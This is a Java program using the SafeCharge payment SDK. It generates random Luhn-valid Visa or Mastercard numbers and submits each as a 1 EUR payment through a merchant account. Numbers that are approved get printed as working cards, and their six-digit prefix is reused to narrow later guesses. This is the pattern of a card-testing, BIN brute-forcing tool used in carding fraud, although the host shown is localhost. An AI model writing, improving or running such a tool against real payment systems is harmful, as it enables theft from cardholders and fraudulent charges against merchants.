import com.safecharge.biz.SafechargeRequestExecutor;
import com.safecharge.model.Card;
import com.safecharge.model.MerchantInfo;
import com.safecharge.model.PaymentOption;
import com.safecharge.request.GetSessionTokenRequest;
import com.safecharge.request.PaymentRequest;
import com.safecharge.request.SafechargeRequest;
import com.safecharge.response.PaymentResponse;
import com.safecharge.response.SafechargeResponse;
import com.safecharge.util.APIConstants;
import com.safecharge.util.Constants;

import java.util.*;

public class CardGenerator {

    private static final String HOST = "http://localhost:8080/ppp/"; //Integration: APIConstants.Environment.INTEGRATION_HOST
    private static final Constants.HashAlgorithm HASH_ALGO = Constants.HashAlgorithm.MD5;
    private static final String MERCHANT_KEY = "";
    private static final String MERCHANT_SITE = "";
    private static final String MERCHANT_ID = "";
    private static final String NAME_ON_CARD = "";
    private static final String EXPIRATION_MONTH = "05";
    private static final String EXPIRATION_YEAR = "25";
    private static final String TEST_AMOUNT = "1";
    private static final String DEFAULT_USER_TOKEN = "darin";
    private static final String DEFAULT_CURRENCY = "EUR";
    private static final String VISA_BIN = "4";
    private static final String MC_BIN = "5";
    private static final String CURRENT_BIN = VISA_BIN; //Change this to MC_BIN for mastercard

    public static void main(String[] args) {
        String originalBin = CURRENT_BIN;
        String name = NAME_ON_CARD;
        String currency = DEFAULT_CURRENCY;

        String bin = originalBin;
        int failsPerBin = 0;
        for(int i = 0; i < 100; i++) {
            StringBuilder num = new StringBuilder(generateCard(bin));
            boolean cardWorks = testCard(num.toString(), name, currency);
            if (cardWorks) {
                bin = num.substring(0,6);
            } else {
                failsPerBin++;
                if (failsPerBin > 5) {
                    bin = originalBin;
                    failsPerBin = 0;
                }
            }
        }
    }

    private static boolean testCard(String ccNumber, String name, String currency) {
        SafechargeRequestExecutor requestExecutor = SafechargeRequestExecutor.getInstance();
        MerchantInfo merchantInfo = new MerchantInfo(MERCHANT_KEY, MERCHANT_ID, MERCHANT_SITE, HOST, HASH_ALGO);

        SafechargeRequest sessionTokenRequest = (SafechargeRequest) GetSessionTokenRequest.builder()
                .addMerchantInfo(merchantInfo)
                .build();

        SafechargeResponse sessionTokenResponse = requestExecutor.executeRequest(sessionTokenRequest);

        PaymentRequest paymentRequest = getPaymentRequest(ccNumber, name, merchantInfo, sessionTokenResponse.getSessionToken(), currency);
        PaymentResponse paymentResponse = (PaymentResponse) requestExecutor.executeRequest(paymentRequest);

        if ("APPROVED".equals(paymentResponse.getTransactionStatus())) {
            System.out.println("Working card found = " + ccNumber);
            return true;
        } else {
            System.out.println(ccNumber + " -> " + paymentResponse.getTransactionStatus() + " Reason: " + paymentResponse.getGwErrorReason());
        }
        return false;
    }

    private static PaymentRequest getPaymentRequest(String ccNumber, String name, MerchantInfo merchantInfo, String sessionToken, String currency) {
        Card cd = new Card();
        cd.setCardNumber(ccNumber);
        cd.setCardHolderName(name);
        cd.setExpirationMonth(EXPIRATION_MONTH);
        cd.setExpirationYear(EXPIRATION_YEAR);

        PaymentOption po = new PaymentOption();
        po.setCard(cd);

        return PaymentRequest.builder()
                .addMerchantInfo(merchantInfo)
                .addUserTokenId(DEFAULT_USER_TOKEN)
                .addSessionToken(sessionToken)
                .addPaymentOption(po)
                .addAmount(TEST_AMOUNT)
                .addCurrency(currency)
                .build();
    }

    private static String generateCard(String bin) {
        Random random = new Random(System.currentTimeMillis());
        int length = 16;
        StringBuilder builder = new StringBuilder(bin);
        for (int i = 0; i < (length - (bin.length() + 1)); i++) {
            int digit = random.nextInt(10);
            builder.append(digit);
        }
        return builder.append(getCheckDigit(builder.toString())).toString();
    }

    private static int getCheckDigit(String number) {
        int sum = 0;
        for (int i = 0; i < number.length(); i++) {
            int digit = Integer.parseInt(number.substring(i, (i + 1)));
            if ((i % 2) == 0) {
                digit = digit * 2;
                if (digit > 9) {
                    digit = (digit / 10) + (digit % 10);
                }
            } sum += digit;
        } int mod = sum % 10;
        return ((mod == 0) ? 0 : 10 - mod);
    }

}